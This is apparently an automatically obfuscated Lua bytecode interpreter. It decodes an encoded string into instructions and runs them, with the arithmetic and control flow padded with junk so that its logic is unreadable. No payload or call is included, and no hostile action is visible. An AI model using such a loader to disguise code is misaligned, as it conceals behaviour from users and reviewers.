

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			v19 = v0(v3(v30, 1, 1));
			return "";
		else
			local v85 = v2(v0(v30, 16));
			if v19 then
				local v115 = v5(v85, v19);
				v19 = nil;
				return v115;
			else
				return v85;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v86 = (0 + 0) - 0;
			local v87;
			while true do
				if (v86 == (0 - 0)) then
					v87 = (v31 / ((3 - 1) ^ (v32 - ((2 - 0) - 1)))) % (2 ^ (((v33 - (620 - ((1620 - (68 + 997)) + 64))) - (v32 - ((2202 - (226 + 1044)) - (857 + 74)))) + 1));
					return v87 - (v87 % (569 - (367 + (875 - 674))));
				end
			end
		else
			local v88 = 927 - (214 + 713);
			local v89;
			while true do
				if (v88 == 0) then
					v89 = (1 + 1) ^ (v32 - (1 + 0));
					return (((v31 % (v89 + v89)) >= v89) and (878 - (282 + 595))) or (1637 - (1523 + 114));
				end
			end
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35, v36 = v1(v16, v18, v18 + (119 - (32 + 85)));
		v18 = v18 + 2 + 0;
		return (v36 * (57 + 199)) + v35;
	end
	local function v23()
		local v37, v38, v39, v40 = v1(v16, v18, v18 + (960 - (892 + 65)));
		v18 = v18 + (9 - 5);
		return (v40 * 16777216) + (v39 * ((121488 - (87 + 263)) - 55602)) + (v38 * ((649 - (67 + 113)) - 213)) + v37;
	end
	local function v24()
		local v41 = v23();
		local v42 = v23();
		local v43 = 1 + (0 - 0);
		local v44 = (v20(v42, 2 - 1, 15 + 5) * ((7 - 5) ^ (984 - (802 + 150)))) + v41;
		local v45 = v20(v42, 56 - 35, (24 + 31) - 24);
		local v46 = ((v20(v42, 24 + 8) == (998 - (915 + (100 - (10 + 8))))) and -(2 - 1)) or 1;
		if (v45 == ((438 - (145 + 293)) + 0)) then
			if (v44 == (0 - 0)) then
				return v46 * ((4566 - 3379) - (1069 + 118));
			else
				local v116 = 430 - (44 + 386);
				while true do
					if (v116 == (0 - 0)) then
						v45 = 1;
						v43 = 0;
						break;
					end
				end
			end
		elseif (v45 == (4477 - 2430)) then
			return ((v44 == 0) and (v46 * ((1 + (442 - (416 + 26))) / (0 - 0)))) or (v46 * NaN);
		end
		return v8(v46, v45 - (1015 + 8)) * (v43 + (v44 / ((793 - (368 + 423)) ^ ((52 + 111) - 111))));
	end
	local function v25(v47)
		local v48;
		if not v47 then
			v47 = v23();
			if (v47 == (0 + 0)) then
				return "";
			end
		end
		v48 = v3(v16, v18, (v18 + v47) - (773 - (201 + 571)));
		v18 = v18 + v47;
		local v49 = {};
		for v66 = 4 - 3, #v48 do
			v49[v66] = v2(v1(v3(v48, v66, v66)));
		end
		return v6(v49);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v50 = (function()
			return function(v90, v91, v92, v93, v94, v95, v96, v97)
				local v90 = (function()
					return 0 + 0;
				end)();
				local v91 = (function()
					return;
				end)();
				local v92 = (function()
					return;
				end)();
				while true do
					if (#"\\" == v90) then
						if (v91 == #",") then
							v92 = (function()
								return v93() ~= (811 - (569 + 242));
							end)();
						elseif (v91 == (5 - 3)) then
							v92 = (function()
								return v94();
							end)();
						elseif (v91 == #"91(") then
							v92 = (function()
								return v95();
							end)();
						end
						v96[v97] = (function()
							return v92;
						end)();
						break;
					end
					if (v90 == (0 + 0)) then
						local v122 = (function()
							return 0;
						end)();
						local v123 = (function()
							return;
						end)();
						while true do
							if (v122 == (0 - 0)) then
								v123 = (function()
									return 0 - 0;
								end)();
								while true do
									if (v123 == 0) then
										v91 = (function()
											return v93();
										end)();
										v92 = (function()
											return nil;
										end)();
										v123 = (function()
											return 1;
										end)();
									end
									if (v123 == (1252 - (721 + 530))) then
										v90 = (function()
											return #"<";
										end)();
										break;
									end
								end
								break;
							end
						end
					end
				end
				return v90, v91, v92, v93, v94, v95, v96, v97;
			end;
		end)();
		local v51 = (function()
			return function(v98, v99, v100, v101, v102, v103, v104, v105, v106)
				local v107 = (function()
					return 1700 - (1419 + 281);
				end)();
				local v98 = (function()
					return;
				end)();
				local v99 = (function()
					return;
				end)();
				while true do
					if ((0 - 0) == v107) then
						local v124 = (function()
							return 0;
						end)();
						while true do
							if (v124 ~= 0) then
							else
								v98 = (function()
									return 74 - (71 + 3);
								end)();
								v99 = (function()
									return nil;
								end)();
								v124 = (function()
									return 1 + 0;
								end)();
							end
							if (v124 == (2 - 1)) then
								v107 = (function()
									return 1 + 0;
								end)();
								break;
							end
						end
					end
					if (v107 ~= (1 - 0)) then
					else
						local v125 = (function()
							return 241 - (187 + 54);
						end)();
						while true do
							if (v125 ~= (780 - (162 + 618))) then
							else
								while true do
									if (v98 == (0 + 0)) then
										v99 = (function()
											return v100();
										end)();
										if (v101(v99, #"~", #"}") ~= (700 - (271 + 429))) then
										else
											local v127 = (function()
												return 0 + 0;
											end)();
											local v128 = (function()
												return;
											end)();
											local v129 = (function()
												return;
											end)();
											local v130 = (function()
												return;
											end)();
											local v131 = (function()
												return;
											end)();
											while true do
												if (v127 == (1501 - (1408 + 92))) then
													local v272 = (function()
														return 0 - 0;
													end)();
													while true do
														if (v272 == 1) then
															v127 = (function()
																return 2 - 0;
															end)();
															break;
														end
														if (v272 ~= (0 + 0)) then
														else
															v130 = (function()
																return nil;
															end)();
															v131 = (function()
																return nil;
															end)();
															v272 = (function()
																return 1289 - (993 + 295);
															end)();
														end
													end
												end
												if (v127 ~= (1636 - (1373 + 263))) then
												else
													v128 = (function()
														return 1000 - (451 + 549);
													end)();
													v129 = (function()
														return nil;
													end)();
													v127 = (function()
														return 1;
													end)();
												end
												if ((1 + 1) == v127) then
													while true do
														if ((2 - 0) ~= v128) then
														else
															local v367 = (function()
																return 0 + 0;
															end)();
															local v368 = (function()
																return;
															end)();
															while true do
																if (v367 ~= (0 + 0)) then
																else
																	v368 = (function()
																		return 0 + 0;
																	end)();
																	while true do
																		if (v368 == 1) then
																			v128 = (function()
																				return #"-19";
																			end)();
																			break;
																		end
																		if (v368 == 0) then
																			if (v101(v130, #"{", #"\\") ~= #"~") then
																			else
																				v131[2] = (function()
																					return v102[v131[2 - 0]];
																				end)();
																			end
																			if (v101(v130, 2, 1386 - (746 + 638)) ~= #"{") then
																			else
																				v131[#"asd"] = (function()
																					return v102[v131[#"xxx"]];
																				end)();
																			end
																			v368 = (function()
																				return 1 + 0;
																			end)();
																		end
																	end
																	break;
																end
															end
														end
														if (#"91(" == v128) then
															if (v101(v130, #"gha", #"91(") == #"\\") then
																v131[#"?id="] = (function()
																	return v102[v131[#"0313"]];
																end)();
															end
															v103[v104] = (function()
																return v131;
															end)();
															break;
														end
														if (v128 == #"\\") then
															local v370 = (function()
																return 0 - 0;
															end)();
															local v371 = (function()
																return;
															end)();
															while true do
																if (v370 == (1322 - (1249 + 73))) then
																	v371 = (function()
																		return 0;
																	end)();
																	while true do
																		if (v371 == 1) then
																			v128 = (function()
																				return 1 + 1;
																			end)();
																			break;
																		end
																		if ((1145 - (466 + 679)) == v371) then
																			v131 = (function()
																				return {v105(),v105(),nil,nil};
																			end)();
																			if (v129 == 0) then
																				local v394 = (function()
																					return 341 - (218 + 123);
																				end)();
																				local v395 = (function()
																					return;
																				end)();
																				while true do
																					if (v394 == (1581 - (1535 + 46))) then
																						v395 = (function()
																							return 0 + 0;
																						end)();
																						while true do
																							if (v395 == 0) then
																								v131[#"asd"] = (function()
																									return v105();
																								end)();
																								v131[#"0313"] = (function()
																									return v105();
																								end)();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			elseif (v129 == #"~") then
																				v131[#"gha"] = (function()
																					return v106();
																				end)();
																			elseif (v129 == (1 + 1)) then
																				v131[#"asd"] = (function()
																					return v106() - ((562 - (306 + 254)) ^ (1 + 15));
																				end)();
																			elseif (v129 == #"asd") then
																				local v400 = (function()
																					return 0 - 0;
																				end)();
																				local v401 = (function()
																					return;
																				end)();
																				while true do
																					if (v400 == 0) then
																						v401 = (function()
																							return 0;
																						end)();
																						while true do
																							if (v401 ~= (1467 - (899 + 568))) then
																							else
																								v131[#"xnx"] = (function()
																									return v106() - (2 ^ (6 + 10));
																								end)();
																								v131[#"0313"] = (function()
																									return v105();
																								end)();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v371 = (function()
																				return 1 + 0;
																			end)();
																		end
																	end
																	break;
																end
															end
														end
														if (v128 == (0 + 0)) then
															local v372 = (function()
																return 0;
															end)();
															local v373 = (function()
																return;
															end)();
															while true do
																if (v372 ~= 0) then
																else
																	v373 = (function()
																		return 0 - 0;
																	end)();
																	while true do
																		if ((0 - 0) ~= v373) then
																		else
																			v129 = (function()
																				return v101(v99, 2, #"asd");
																			end)();
																			v130 = (function()
																				return v101(v99, #"asd1", 609 - (268 + 335));
																			end)();
																			v373 = (function()
																				return 291 - (60 + 230);
																			end)();
																		end
																		if (v373 == (573 - (426 + 146))) then
																			v128 = (function()
																				return #",";
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														end
													end
													break;
												end
											end
										end
										break;
									end
								end
								return v98, v99, v100, v101, v102, v103, v104, v105, v106;
							end
						end
					end
				end
			end;
		end)();
		local v52 = (function()
			return function(v108, v109, v110)
				local v111 = (function()
					return 0 + 0;
				end)();
				while true do
					if ((584 - (57 + 527)) ~= v111) then
					else
						v108[v109 - #"["] = (function()
							return v110();
						end)();
						return v108, v109, v110;
					end
				end
			end;
		end)();
		local v53 = (function()
			return {};
		end)();
		local v54 = (function()
			return {};
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {v53,v54,nil,v55};
		end)();
		local v57 = (function()
			return v23();
		end)();
		local v58 = (function()
			return {};
		end)();
		for v68 = #"}", v57 do
			FlatIdent_23BE8, Type, Cons, v21, v24, v25, v58, v68 = (function()
				return v50(FlatIdent_23BE8, Type, Cons, v21, v24, v25, v58, v68);
			end)();
		end
		v56[#"19("] = (function()
			return v21();
		end)();
		for v69 = #"{", v23() do
			FlatIdent_31A5A, Descriptor, v21, v20, v58, v53, v69, v22, v23 = (function()
				return v51(FlatIdent_31A5A, Descriptor, v21, v20, v58, v53, v69, v22, v23);
			end)();
		end
		for v70 = #"}", v23() do
			v54, v70, v28 = (function()
				return v52(v54, v70, v28);
			end)();
		end
		return v56;
	end
	local function v29(v60, v61, v62)
		local v63 = v60[1];
		local v64 = v60[105 - (17 + 86)];
		local v65 = v60[3 + 0];
		return function(...)
			local v71 = v63;
			local v72 = v64;
			local v73 = v65;
			local v74 = v27;
			local v75 = 1 - 0;
			local v76 = -(2 - (1 + 0));
			local v77 = {};
			local v78 = {...};
			local v79 = v12("#", ...) - (3 - 2);
			local v80 = {};
			local v81 = {};
			for v112 = 0, v79 do
				if ((v112 >= v73) or (4951 < 4430)) then
					v77[v112 - v73] = v78[v112 + 1];
				else
					v81[v112] = v78[v112 + (167 - (122 + 44))];
				end
			end
			local v82 = (v79 - v73) + ((552 - (83 + 468)) - 0);
			local v83;
			local v84;
			while true do
				v83 = v71[v75];
				v84 = v83[3 - 2];
				if (v84 <= 34) then
					if (v84 <= 16) then
						if (v84 <= (6 + 1)) then
							if (v84 <= (1 + 2)) then
								if ((96 == 96) and (v84 <= (1 - 0))) then
									if ((v84 == (65 - (30 + 35))) or (2739 > 4008)) then
										local v132 = 0 + 0;
										local v133;
										while true do
											if (v132 == 0) then
												v133 = v83[1259 - (1043 + 214)];
												v81[v133] = v81[v133]();
												break;
											end
										end
									else
										v81[v83[7 - (1811 - (1202 + 604))]] = v83[1215 - (323 + 889)] ~= (0 - 0);
									end
								elseif (v84 > (9 - 7)) then
									v81[v83[582 - (361 + 219)]]();
								else
									for v240 = v83[(535 - 213) - ((146 - 93) + 267)], v83[1 + 2] do
										v81[v240] = nil;
									end
								end
							elseif (v84 <= 5) then
								if (v84 > (417 - (15 + 398))) then
									v81[v83[984 - (18 + 964)]] = {};
								else
									local v136 = v83[7 - 5];
									do
										return v13(v81, v136, v76);
									end
								end
							elseif (v84 > 6) then
								local v137 = v83[2 + 0];
								v81[v137] = v81[v137](v81[v137 + 1 + 0]);
							else
								local v139 = 850 - (20 + (1155 - (45 + 280)));
								local v140;
								local v141;
								local v142;
								local v143;
								while true do
									if ((v139 == (1 + 0)) or (23 == 1134)) then
										v76 = (v142 + v140) - (127 - (116 + 10));
										v143 = 0 + 0;
										v139 = 740 - (542 + 196);
									end
									if ((v139 == (0 - 0)) or (2693 >= 4111)) then
										v140 = v83[1 + 1];
										v141, v142 = v74(v81[v140](v13(v81, v140 + 1, v83[2 + 1])));
										v139 = 1 + 0 + 0;
									end
									if ((v139 == (4 - 2)) or (4316 <= 2146)) then
										for v338 = v140, v76 do
											local v339 = 0 - 0;
											while true do
												if (v339 == (1551 - (984 + 142 + 425))) then
													v143 = v143 + (406 - (118 + 287));
													v81[v338] = v141[v143];
													break;
												end
											end
										end
										break;
									end
								end
							end
						elseif ((v84 <= (43 - (12 + 20))) or (3546 <= 2809)) then
							if (v84 <= (1130 - (118 + 1003))) then
								if (v84 > (23 - 15)) then
									v81[v83[379 - (142 + 235)]][v83[13 - 10]] = v83[1 + 0 + 3];
								else
									v81[v83[979 - (553 + 424)]] = v83[5 - 2];
								end
							elseif (v84 == (2 + 7 + (1 - 0))) then
								v81[v83[2]] = v61[v83[3 + 0]];
							elseif ((4904 > 2166) and v81[v83[2]]) then
								v75 = v75 + 1 + 0;
							else
								v75 = v83[3];
							end
						elseif ((109 >= 90) and (v84 <= (6 + 7))) then
							if ((4978 > 2905) and (v84 == (7 + (1916 - (340 + 1571))))) then
								local v150 = 0 - 0;
								local v151;
								local v152;
								local v153;
								while true do
									if (v150 == (0 - 0)) then
										v151 = v72[v83[6 - (2 + 1)]];
										v152 = nil;
										v150 = 1 + 0;
									end
									if (v150 == ((1776 - (1733 + 39)) - 3)) then
										v153 = {};
										v152 = v10({}, {__index=function(v340, v341)
											local v342 = v153[v341];
											return v342[2 - 1][v342[755 - (239 + 514)]];
										end,__newindex=function(v343, v344, v345)
											local v346 = v153[v344];
											v346[1 + 0][v346[1331 - (797 + 532)]] = v345;
										end});
										v150 = 2;
									end
									if ((v150 == (2 + 0)) or (3026 <= 2280)) then
										for v348 = 1, v83[2 + 2] do
											v75 = v75 + (2 - 1);
											local v349 = v71[v75];
											if (v349[(540 + 663) - (373 + 829)] == (798 - (476 + 255))) then
												v153[v348 - (1131 - ((526 - 157) + 761))] = {v81,v349[3]};
											else
												v153[v348 - (1 - 0)] = {v61,v349[3]};
											end
											v80[#v80 + (1 - 0)] = v153;
										end
										v81[v83[338 - (144 + 187 + 5)]] = v29(v151, v152, v62);
										break;
									end
								end
							else
								v81[v83[218 - (42 + 174)]] = {};
							end
						elseif ((v84 <= (11 + 3)) or (1653 <= 1108)) then
							v81[v83[2 + 0]] = v29(v72[v83[2 + 1]], nil, v62);
						elseif (v84 == (1519 - (363 + 1141))) then
							v81[v83[1582 - (1183 + 397)]] = v81[v83[8 - (517 - (409 + 103))]][v83[3 + 1]];
						else
							local v276 = v83[(238 - (46 + 190)) + 0];
							local v277, v278 = v74(v81[v276]());
							v76 = (v278 + v276) - (1976 - ((2008 - (51 + 44)) + 62));
							local v279 = 0;
							for v319 = v276, v76 do
								local v320 = 0;
								while true do
									if ((2909 > 2609) and (v320 == (0 + 0))) then
										v279 = v279 + 1;
										v81[v319] = v277[v279];
										break;
									end
								end
							end
						end
					elseif (v84 <= 25) then
						if ((757 > 194) and (v84 <= 20)) then
							if (v84 <= (47 - 29)) then
								if (v84 > ((550 + 1400) - (565 + (2685 - (1114 + 203))))) then
									v75 = v83[11 - (734 - (228 + 498))];
								else
									v81[v83[1663 - (320 + 1157 + 184)]][v83[3 - 0]] = v81[v83[4 + 0]];
								end
							elseif (v84 == 19) then
								local v159 = v83[858 - (564 + 292)];
								local v160 = {v81[v159](v13(v81, v159 + 1, v76))};
								local v161 = 0 - 0;
								for v242 = v159, v83[308 - (244 + 60)] do
									local v243 = 0 + 0;
									while true do
										if (v243 == (476 - (41 + 435))) then
											v161 = v161 + (1002 - (938 + 63));
											v81[v242] = v160[v161];
											break;
										end
									end
								end
							else
								local v162 = v83[2 + 0];
								local v163 = v81[v83[3]];
								v81[v162 + (1126 - (518 + 418 + 189))] = v163;
								v81[v162] = v163[v83[4]];
							end
						elseif (v84 <= (8 + 14)) then
							if (v84 == 21) then
								v81[v83[1615 - (1565 + 48)]][v83[2 + 1]] = v81[v83[1142 - (782 + 356)]];
							else
								do
									return;
								end
							end
						elseif (v84 <= (290 - (176 + 91))) then
							v81[v83[4 - (665 - (174 + 489))]] = v62[v83[3]];
						elseif (v84 > (34 - 10)) then
							local v280 = v83[1094 - (975 + (304 - 187))];
							local v281, v282 = v74(v81[v280]());
							v76 = (v282 + v280) - (1876 - (157 + 1718));
							local v283 = 0;
							for v321 = v280, v76 do
								v283 = v283 + 1 + (1905 - (830 + 1075));
								v81[v321] = v281[v283];
							end
						else
							local v284 = v83[6 - 4];
							v81[v284](v13(v81, v284 + (3 - 2), v83[1021 - (697 + 321)]));
						end
					elseif ((v84 <= ((602 - (303 + 221)) - (1318 - (231 + 1038)))) or (31 >= 1398)) then
						if ((3196 <= 4872) and (v84 <= (57 - 30))) then
							if (v84 == (59 - 33)) then
								local v171 = v83[1 + 1];
								v81[v171](v81[v171 + (1 - 0)]);
							else
								do
									return;
								end
							end
						elseif (v84 == (74 - 46)) then
							local v172 = 0;
							local v173;
							local v174;
							local v175;
							local v176;
							while true do
								if (v172 == 2) then
									for v353 = v173, v76 do
										v176 = v176 + (1228 - (322 + 755 + 150));
										v81[v353] = v174[v176];
									end
									break;
								end
								if ((3326 == 3326) and (v172 == (612 - (602 + 9)))) then
									v76 = (v175 + v173) - (1190 - (449 + 740));
									v176 = 0;
									v172 = 874 - (826 + 46);
								end
								if ((1433 <= 3878) and (v172 == (947 - (245 + 702)))) then
									v173 = v83[6 - 4];
									v174, v175 = v74(v81[v173](v13(v81, v173 + (1163 - (171 + 991)) + 0, v83[1901 - (260 + 1638)])));
									v172 = 441 - (382 + (238 - 180));
								end
							end
						else
							v81[v83[6 - 4]] = v81[v83[3 + 0]];
						end
					elseif (v84 <= (63 - 32)) then
						if (v84 == (80 - 50)) then
							local v179 = v83[5 - 3];
							local v180, v181 = v74(v81[v179](v81[v179 + (1206 - (902 + 303))]));
							v76 = (v181 + v179) - (1 - (0 - 0));
							local v182 = 0 - 0;
							for v244 = v179, v76 do
								local v245 = 0 + 0 + 0;
								while true do
									if ((v245 == (1690 - (1121 + 569))) or (1583 == 1735)) then
										v182 = v182 + (215 - (22 + (672 - 480)));
										v81[v244] = v180[v182];
										break;
									end
								end
							end
						else
							local v183 = v83[685 - (483 + 200)];
							local v184 = v83[(4231 - 2764) - (1404 + 59)];
							local v185 = v183 + (5 - 3);
							local v186 = {v81[v183](v81[v183 + 1], v81[v185])};
							for v246 = 1 - 0, v184 do
								v81[v185 + v246] = v186[v246];
							end
							local v187 = v186[766 - (468 + (917 - 620))];
							if v187 then
								local v285 = 562 - (334 + 228);
								while true do
									if (((0 - 0) == v285) or (2981 == 2350)) then
										v81[v185] = v187;
										v75 = v83[6 - 3];
										break;
									end
								end
							else
								v75 = v75 + (1 - 0);
							end
						end
					elseif (v84 <= (10 + 22)) then
						v81[v83[1250 - (111 + 1137)]] = v83[239 - ((299 - (91 + 67)) + 95)];
					elseif (v84 > (33 + 0)) then
						local v286 = v83[4 - 2];
						v81[v286](v81[v286 + (2 - (2 - 1))]);
					else
						local v287 = v83[1 + 1];
						v81[v287] = v81[v287](v81[v287 + (2 - 1)]);
					end
				elseif (v84 <= (36 + 15)) then
					if ((v84 <= (22 + 5 + 15)) or (4466 <= 493)) then
						if ((v84 <= ((576 - (423 + 100)) - 15)) or (2547 <= 1987)) then
							if (v84 <= (22 + 14)) then
								if (v84 == (198 - (92 + 71))) then
									local v190 = 0 + 0;
									local v191;
									while true do
										if ((2961 > 2740) and (v190 == (0 - 0))) then
											v191 = v83[767 - (574 + 191)];
											v81[v191](v13(v81, v191 + 1 + 0 + 0, v76));
											break;
										end
									end
								else
									local v192 = v83[4 - (5 - 3)];
									local v193, v194 = v74(v81[v192](v81[v192 + 1 + 0]));
									v76 = (v194 + v192) - (850 - (254 + 595));
									local v195 = 126 - (55 + 38 + 33);
									for v249 = v192, v76 do
										local v250 = 0 - 0;
										while true do
											if ((3696 >= 3612) and ((1790 - (573 + 1217)) == v250)) then
												v195 = v195 + (2 - 1);
												v81[v249] = v193[v195];
												break;
											end
										end
									end
								end
							elseif (v84 > (3 + 34)) then
								local v196 = v83[2 - 0];
								local v197 = {};
								for v251 = 1, #v80 do
									local v252 = v80[v251];
									for v289 = (1710 - (326 + 445)) - ((3115 - 2401) + 225), #v252 do
										local v290 = v252[v289];
										local v291 = v290[2 - 1];
										local v292 = v290[4 - 2];
										if ((v291 == v81) and (v292 >= v196)) then
											local v360 = 0 - 0;
											while true do
												if (v360 == (0 + 0)) then
													v197[v292] = v291[v292];
													v290[1 - 0] = v197;
													break;
												end
											end
										end
									end
								end
							else
								local v198 = 0;
								local v199;
								while true do
									if (v198 == 0) then
										v199 = v83[808 - (118 + 688)];
										v81[v199] = v81[v199](v13(v81, v199 + (49 - (25 + 23)), v83[1 + 2]));
										break;
									end
								end
							end
						elseif (v84 <= (1926 - (927 + 959))) then
							if (v84 > (131 - 92)) then
								v81[v83[734 - (16 + 716)]] = v83[3] ~= (0 - 0);
							else
								local v201 = v83[99 - (11 + 86)];
								local v202 = {};
								for v253 = 1, #v80 do
									local v254 = v80[v253];
									for v293 = 0 - 0, #v254 do
										local v294 = v254[v293];
										local v295 = v294[286 - (175 + 110)];
										local v296 = v294[4 - 2];
										if ((v295 == v81) and (v296 >= v201)) then
											local v361 = 0 - 0;
											while true do
												if (v361 == 0) then
													v202[v296] = v295[v296];
													v294[1797 - (503 + 1293)] = v202;
													break;
												end
											end
										end
									end
								end
							end
						elseif (v84 > (114 - 73)) then
							if not v81[v83[(4 - 2) + 0]] then
								v75 = v75 + (1062 - (810 + 251));
							else
								v75 = v83[3 + 0];
							end
						else
							do
								return v81[v83[1 + 1]]();
							end
						end
					elseif (v84 <= 46) then
						if (v84 <= (40 + 4)) then
							if (v84 == (576 - (43 + 490))) then
								if ((v81[v83[735 - (711 + 22)]] == v83[4]) or (2970 == 1878)) then
									v75 = v75 + 1;
								else
									v75 = v83[11 - 8];
								end
							else
								local v203 = 0;
								local v204;
								while true do
									if (v203 == (859 - ((951 - (530 + 181)) + 619))) then
										v204 = v83[883 - (614 + 267)];
										v81[v204] = v81[v204](v13(v81, v204 + (33 - (19 + 13)) + 0, v83[4 - 1]));
										break;
									end
								end
							end
						elseif (v84 > (71 - 26)) then
							v81[v83[1 + 1]] = v81[v83[1747 - (1344 + 400)]][v83[409 - (255 + 150)]];
						else
							v81[v83[2 + (0 - 0)]] = v29(v72[v83[2 + 1]], nil, v62);
						end
					elseif (v84 <= (205 - 157)) then
						if (v84 == 47) then
							local v208 = v83[6 - 4];
							v81[v208] = v81[v208](v13(v81, v208 + (1740 - (404 + 1335)), v76));
						else
							local v210 = v83[408 - (183 + 223)];
							v81[v210](v13(v81, v210 + (1 - 0), v83[2 + 1]));
						end
					elseif (v84 <= 49) then
						local v211 = 0 + (0 - 0);
						local v212;
						local v213;
						local v214;
						while true do
							if (v211 == 0) then
								v212 = v83[339 - (10 + 327)];
								v213 = {v81[v212](v13(v81, v212 + 1 + 0, v76))};
								v211 = 339 - (118 + 220);
							end
							if (v211 == (1 + 0)) then
								v214 = 449 - (108 + 89 + 252);
								for v362 = v212, v83[2 + 2] do
									v214 = v214 + (4 - 3);
									v81[v362] = v213[v214];
								end
								break;
							end
						end
					elseif (v84 == (1543 - (711 + 782))) then
						if (v81[v83[3 - 1]] == v83[473 - (270 + 199)]) then
							v75 = v75 + 1 + 0;
						else
							v75 = v83[1822 - (580 + 1239)];
						end
					else
						local v299 = 0 - 0;
						local v300;
						while true do
							if (v299 == (0 + 0)) then
								v300 = v83[1 + 1];
								do
									return v13(v81, v300, v76);
								end
								break;
							end
						end
					end
				elseif ((v84 <= (27 + 33)) or (3693 < 1977)) then
					if (v84 <= (143 - 88)) then
						if (v84 <= (33 + 20)) then
							if (v84 == 52) then
								v81[v83[1169 - (645 + 522)]]();
							else
								local v215 = v72[v83[1793 - ((1776 - 766) + 780)]];
								local v216;
								local v217 = {};
								v216 = v10({}, {__index=function(v255, v256)
									local v257 = 0;
									local v258;
									while true do
										if (v257 == (0 + 0)) then
											v258 = v217[v256];
											return v258[4 - 3][v258[5 - 3]];
										end
									end
								end,__newindex=function(v259, v260, v261)
									local v262 = v217[v260];
									v262[1813 - (1293 + 519)][v262[1838 - (1045 + 791)]] = v261;
								end});
								for v264 = 2 - 1, v83[9 - 5] do
									v75 = v75 + (1 - (0 - 0));
									local v265 = v71[v75];
									if ((v265[506 - (351 + 154)] == (1641 - (1281 + 293))) or (930 > 2101)) then
										v217[v264 - (267 - ((120 - 92) + 238))] = {v81,v265[3]};
									else
										v217[v264 - (1 + 0)] = {v61,v265[10 - 7]};
									end
									v80[#v80 + 1 + 0 + 0] = v217;
								end
								v81[v83[472 - (381 + 89)]] = v29(v215, v216, v62);
							end
						elseif ((4153 > 3086) and (v84 == (48 + 6))) then
							if not v81[v83[1 + 1 + (0 - 0)]] then
								v75 = v75 + (1 - 0);
							else
								v75 = v83[1159 - (1074 + 82)];
							end
						else
							v81[v83[3 - 1]] = v61[v83[1787 - (214 + 1570)]];
						end
					elseif ((v84 <= (1512 - (990 + 465))) or (4654 <= 4050)) then
						if (v84 > (6 + 18 + 32)) then
							do
								return v81[v83[1 + 1]]();
							end
						else
							local v221 = v83[2 + 0];
							local v222 = v83[4];
							local v223 = v221 + (7 - 5);
							local v224 = {v81[v221](v81[v221 + (627 - (512 + 114))], v81[v223])};
							for v267 = 1, v222 do
								v81[v223 + v267] = v224[v267];
							end
							local v225 = v224[1 + 0];
							if (v225 or (2602 < 1496)) then
								v81[v223] = v225;
								v75 = v83[7 - 4];
							else
								v75 = v75 + 1;
							end
						end
					elseif ((v84 <= 58) or (1020 > 2288)) then
						for v270 = v83[3 - (1 + 0)], v83[3] do
							v81[v270] = nil;
						end
					elseif ((328 == 328) and (v84 > (205 - 146))) then
						local v304 = v83[1 + 1];
						local v305 = {v81[v304](v81[v304 + 1 + 0])};
						local v306 = 0;
						for v333 = v304, v83[4] do
							v306 = v306 + 1 + 0;
							v81[v333] = v305[v306];
						end
					else
						local v307 = v83[6 - (1100 - (709 + 387))];
						local v308 = {v81[v307](v81[v307 + (1470 - (1269 + 200))])};
						local v309 = 0 - 0;
						for v336 = v307, v83[11 - 7] do
							local v337 = 815 - ((314 - 216) + 717);
							while true do
								if (v337 == ((1358 - 532) - (802 + 24))) then
									v309 = v309 + ((1 + 0) - 0);
									v81[v336] = v308[v309];
									break;
								end
							end
						end
					end
				elseif ((1511 < 3808) and (v84 <= (80 - 16))) then
					if (v84 <= (10 + 52)) then
						if ((v84 == (47 + 14)) or (2510 > 4919)) then
							local v226 = v83[2 + 0];
							v81[v226] = v81[v226]();
						else
							local v228 = v83[1 + 1];
							local v229 = v81[v83[1 + 2]];
							v81[v228 + (2 - 1)] = v229;
							v81[v228] = v229[v83[13 - 9]];
						end
					elseif (v84 == (23 + 40)) then
						v75 = v83[2 + (1 - 0)];
					else
						v81[v83[1 + 1 + 0]][v83[3 + 0]] = v83[2 + 2];
					end
				elseif (v84 <= (1499 - (797 + 636))) then
					if (v84 == (315 - 250)) then
						v81[v83[2]] = v62[v83[1622 - ((2844 - 1417) + 192)]];
					elseif v81[v83[2]] then
						v75 = v75 + 1;
					else
						v75 = v83[(3 - 1) + (1881 - (446 + 1434))];
					end
				elseif ((4763 == 4763) and (v84 <= (155 - 88))) then
					v81[v83[2 + 0]] = v81[v83[2 + 1]];
				elseif (v84 == (394 - (192 + 134))) then
					local v311 = v83[2];
					v81[v311] = v81[v311](v13(v81, v311 + 1, v76));
				else
					local v313 = v83[1278 - (316 + 960)];
					v81[v313](v13(v81, v313 + 1 + (1283 - (1040 + 243)), v76));
				end
				v75 = v75 + 1 + 0;
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
